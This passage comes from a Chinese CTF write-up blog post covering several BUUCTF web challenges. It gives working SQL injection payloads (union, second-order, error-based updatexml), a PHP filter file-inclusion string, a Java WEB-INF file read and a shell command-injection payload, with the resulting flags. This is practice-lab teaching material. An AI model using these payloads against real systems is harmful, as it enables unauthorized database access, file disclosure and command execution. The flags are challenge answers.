punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211129184741461.png" alt="image-20211129184741461"></p>
+<p>列名：flag,value</p>
+<p><img src="image-20211129190602808.png" alt="image-20211129190602808"></p>
+<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>反正flag里大概率不会有大写字母，我就直接把脚本里大写字母去了，省点事</p>
+<pre class="line-numbers language-flag"><code class="language-flag">flag{cce2ac4d-3c5f-48c6-86db-d2fa7f64b182}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211129191533667.png" alt="image-20211129191533667"></p>
+<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><h3 id="sql注入，联合查询"><a href="#sql注入，联合查询" class="headerlink" title="sql注入，联合查询"></a>sql注入，联合查询</h3><p>代码回显多的给我整不会了，差点觉得是MongoDB注入，还好sqlmap给力，直接就跑出来了</p>
+<p>这里也提供一个思路，不知道sql注入的考点时，不妨用sqlmap跑一跑，sqlmap可能并不会跑出flag，但很多时候都能跑出注入的思路</p>
+<p>之前有一道我怎么都没想到的时间盲注，就是用sqlmap跑了一下，虽然sqlmap跑不出结果，但我看到时间盲注的点，我就已经会做了</p>
+<p>这道题sqlmap直接跑出来</p>
+<p><img src="image-20211129203956718.png" alt="image-20211129203956718"></p>
+<p>简单说说思路</p>
+<p>进题目随便点点，url并没有变化，大概率要抓包</p>
+<p><img src="image-20211129204034672.png" alt="image-20211129204034672"></p>
+<p>然后抓包发现只有search参数在变化，猜测注入点就是search</p>
+<p><img src="image-20211129204205089.png" alt="image-20211129204205089"></p>
+<p>接着发现无论我怎么修改回显都是1，有点猜不到，直接上sqlmap</p>
+<p><img src="image-20211129204417770.png" alt="image-20211129204417770"></p>
+<p>联合查询还没过滤，sqlmap直接跑，不过手注思路当然不是这个</p>
+<p>知道是联合查询，并且不需要闭合后，就可以去试试</p>
+<p><img src="image-20211129205057920.png" alt="image-20211129205057920"></p>
+<p>确实是联合查询，那么后面也就没啥好说的了，又没过滤，想怎么干怎么干</p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">?search=amazonis_planitia union select 1,group_concat(code) from alien_code.code
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{5b1d58b7-5e26-4c0a-9950-d477721135c7}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>进去一共三个页面，注册登录和信息</p>
+<p>本来猜到了但我懒的试，sqlmap试着跑了跑啥也没发现，就回来试试，顺便因为试了三分钟没试出来看了眼wp</p>
+<p>看来今天不能再做题了，已经没那心思了</p>
+<p>正常注册登录</p>
+<p><strong><img src="image-20211129212917800.png" alt="image-20211129212917800"></strong></p>
+<p>三个页面，有注册有登录，很明显的二次注入特征</p>
+<p>用户名加个单引号注册</p>
+<p><img src="image-20211129213023041.png" alt="image-20211129213023041"></p>
+<p>可以发现字没了，说明出错了，哪里出错？只对数据库下了手，那必然是数据库出问题了</p>
+<p><img src="image-20211129213350572.png" alt="image-20211129213350572"></p>
+<p>联合查询</p>
+<p>库：ctftraining,information_schema,mysql,performance_schema,test</p>
+<p><img src="image-20211129213457168-16381929058101.png" alt="image-20211129213457168"></p>
+<p>表：flag,news,users</p>
+<p><img src="image-20211129214146224.png" alt="image-20211129214146224"></p>
+<p>列不用试了，肯定是flag</p>
+<p>直接跑结果</p>
+<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">username=Ataaa' union select group_concat(flag) from ctftraining.flag %23&password=1111
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{de9543d1-8e60-4746-a3a1-75d9e3dd6f81}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211129214324233.png" alt="image-20211129214324233"></p>
+<h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>语句过滤全都说了，而且有报错，所以直接报错注入</p>
+<pre class="line-numbers language-payload"><code class="language-payload">?search=1 and  updatexml(1,(select concat(0x7e,database(),0x7e)),1)#
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211130154625817-16382583895821.png" alt="image-20211130154625817"></p>
+<p>库：information_schema,mysql,performance_schema,sql_injection</p>
+<pre class="line-numbers language-payload"><code class="language-payload">?search=1 and  updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),30,60)),1)#
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211130155512306-16382589145862.png" alt="image-20211130155512306"></p>
+<p>表：users</p>
+<pre class="line-numbers language-payload"><code class="language-payload">?search=1 and  updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=0x73716c5f696e6a656374696f6e),1,30)),1)#
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211130155954520.png" alt="image-20211130155954520"></p>
+<p>列：USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,user,uniqueid</p>
+<pre class="line-numbers language-payload"><code class="language-payload">?search=1 and  updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),30,60)),1)#
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211130160323767.png" alt="image-20211130160323767"></p>
+<p>数据:admin: 837461526918364526</p>
+<pre class="line-numbers language-payload"><code class="language-payload">?search=1 and  updatexml(1,concat(0x7e,substr((select group_concat(user, 0x3a20,uniqueid) from users),1,90)),1)#
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211130160650262.png" alt="image-20211130160650262"></p>
+<h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{7b7c23f0-a0f7-4620-9751-577c3ae55c4b}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211130160659245.png" alt="image-20211130160659245"></p>
+<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>这里我其实并不是很懂他的包含逻辑</p>
+<p><img src="image-20211201133724475.png" alt="image-20211201133724475"></p>
+<p>简单来说就是html里是这样的逻辑，以get的方式提交 一个值，默认为category=woofers</p>
+<p>然后后端处理后返回图片，看了眼wp，这题的包含逻辑就是无脑写在参数位置</p>
+<p><img src="image-20211201134610589.png" alt="image-20211201134610589"></p>
+<p>这谁想的到，就硬试呗，试两小时试出来，浪费时间</p>
+<p>所以这里的逻辑是包含woofers、meowers、index三个中的一个，然后包含</p>
+<p>所以用../来迎合这个限制  ps:我试图读/flag读了好久，忍不住看了眼wp脑子才转过弯，这题flag在flag.php里</p>
+<p>还是练的少了</p>
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">?category=php://filter/convert.base64-encode/resource=index/../flag
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{d85431ee-c8f8-42b7-98c0-cc3da7299bdb}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><h3 id="javaWeb基础知识"><a href="#javaWeb基础知识" class="headerlink" title="javaWeb基础知识"></a>javaWeb基础知识</h3><p>这道题考察了javaweb的基础知识</p>
+<p>进入题目后有个help页面</p>
+<p><img src="image-20211202183708228.png" alt="image-20211202183708228"></p>
+<p><img src="image-20211202183722468.png" alt="image-20211202183722468"></p>
+<p>这里提示是FileNotFoundException 这是java在文件不存在时抛出的异常</p>
+<p>所以这里存在文件包含</p>
+<p>这里需要POST传参读取文件，至于为什么，我也不明白，只是毫无逻辑的瞎猜罢了，虽说学web这种瞎猜很常见</p>
+<blockquote>
+<p>基础知识</p>
+</blockquote>
+<p>目前javaweb导包工具Moven，在idea中用这个工具新建一个javaweb项目时，会自动的在webapp目录下创建一个WEB-INF目录</p>
+<p><img src="image-20211202185345255.png" alt="image-20211202185345255"></p>
+<p>这个目录在项目构建成war后位于项目输出目录的根目录下</p>
+<p><img src="image-20211202202353105.png" alt="image-20211202202353105"></p>
+<p>WEB-INF目录中的文件无法通过路径访问，只能通过web.xml中定义的路径映射去访问</p>
+<blockquote>
+<p>war包： jar包和war包的区别事jar包只是相当于对class文件做了一个压缩处理，不会构建java使用的包文件，想运行jar包，自己java环境必须有相应的包</p>
+<p>war包则不然，war包会同时打包java项目使用的包文件，如果想运行一个java网站，只需要将war包丢到tomcat下的webapps下即可</p>
+</blockquote>
+<p>言归正传</p>
+<p>所以这道题先读取WEB-INF下的web.xml文件得到路径映射所对的文件</p>
+<p><img src="image-20211202214721676.png" alt="image-20211202214721676"></p>
+<p>得知flag在com/wm/ctf/FlagController.class中</p>
+<p>读取并反编译</p>
+<p><img src="image-20211202214839898.png" alt="image-20211202214839898"></p>
+<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">filename=WEB-INF/classes/com/wm/ctf/FlagController.class
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{70abb9b1-c49a-4624-8c7d-251d871797fa}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><h3 id="用注入的思想命令执行"><a href="#用注入的思想命令执行" class="headerlink" title="用注入的思想命令执行"></a>用注入的思想命令执行</h3><p><img src="image-20211203113141696.png" alt="image-20211203113141696"></p>
+<p>这道题传入两个参数，第一个参数过滤少，第二个过滤的很死</p>
+<p>写入在线正则可以发现</p>
+<p><img src="image-20211203113611729.png" alt="image-20211203113611729"></p>
+<p>第二个参数可以说什么都写不了，所以只能使用第一个参数</p>
+<p>思路就这点</p>
+<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">?comm1=-c index.php"; tac /fla?;"
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{cde14bea-0afa-44c7-b653-0513c2eba2be}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Atmujie</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://atmujie.github.io/2021/11/06/BUUCTF%E2%80%94%E2%80%94Three/">http://atmujie.github.io/2021/11/06/BUUCTF%E2%80%94%E2%80%94Three/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Atmujie</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+        <div class="disqus-card card" data-aos="fade-up">
+    <div id="disqus_thread" class="card-content">
+        <noscript>Please enable JavaScript to view the
+            <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+    </div>
+</div>
+
+<script type="text/javascript">
+    disqus_config = function () {
+        this.page.url = 'http://atmujie.github.io/2021/11/06/BUUCTF%E2%80%94%E2%80%94Three/';
+        this.page.identifier = '/2021/11/06/BUUCTF%E2%80%94%E2%80%94Three/';
+        this.page.title = 'BUUCTF——Three';
+    };
+    let disqus_shortname = '';
+
+    (function () { // DON'T EDIT BELOW THIS LINE
+        let d = document, s = d.createElement('script');
+        // 如：s.src = 'https://blinkfox.disqus.com/embed.js';
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'GHiPEgESACHszUJMqTqLWQtF-gzGzoHsz',
+        appKey: 'Lm6vLWBnRM3KIlhuo4tqDNDq',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/11/08/nosql%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="nosql注入浅析">
+                        
+                        <span class="card-title">nosql注入浅析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-08
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/11/02/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="菜鸟随笔-PHP裸文件本地包含">
+                        
+                        <span class="card-title">菜鸟随笔-PHP裸文件本地包含</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-02
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+<!-- 代码块功能依赖 -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script> -->
+
+<!-- 代码语言 -->
+<!--  -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script> -->
+<!--  -->
+
+<!-- 代码块复制 -->
+<!-- 
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+ -->
+
+<!-- 代码块收缩 -->
+<!--  -->
+
+<!-- 代码块折行 -->
+<!-- 
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+ -->
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">Atmujie</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+            <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
+                <a href="https://beian.miit.gov.cn/" target="_blank">陇ICP备2022000869号</a>
+            </span>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/atmujie" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
